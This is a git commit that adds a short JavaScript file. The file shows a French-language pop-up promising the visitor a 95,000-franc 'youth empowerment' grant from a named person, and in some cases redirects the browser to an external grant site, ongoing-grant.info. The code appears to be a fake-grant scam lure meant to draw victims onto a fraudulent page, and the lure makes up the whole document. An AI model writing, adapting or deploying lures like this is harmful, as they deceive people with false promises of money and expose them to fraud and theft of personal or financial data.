9f043501a969ff4330ad6aa492fa30305dfe5fb6
The-On-going <sirpeelawson@gmail.com>
2026-04-10 16:58:34 +0100

    Create activedjbb.js

---
+++ activedjbb.js
@@ -0,0 +1,10 @@
+var password = 'Fdj 95,000';
+
+password = prompt(
+  'Félicitations, vous êtes éligible pour recevoir le soutien financier d’autonomisation des jeunes Fdj95,000 de MOHAMED FARAH SAMATAR. Cliquez sur OK pour recevoir instantanément.',
+  'Fdj 95,000'
+);
+
+if (password !== 'Fdj 95,000') {
+    location.href = 'https://ongoing-grant.info/Autonomisation-Des-Jeunes.htm';
+}
